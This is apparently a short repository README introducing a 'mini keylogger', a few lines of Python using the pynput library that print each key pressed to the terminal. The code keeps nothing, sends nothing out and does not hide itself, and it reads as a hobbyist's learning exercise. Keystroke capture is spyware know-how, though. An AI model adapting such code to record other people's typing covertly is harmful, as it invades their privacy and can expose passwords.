# mini_keylogger

it is an mini keylogger which prints all key strokes typed in our terminal(iam using in kali)

ill attach the code;)


import pynput.keyboard


def callback_function(key):
    print(key)

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()
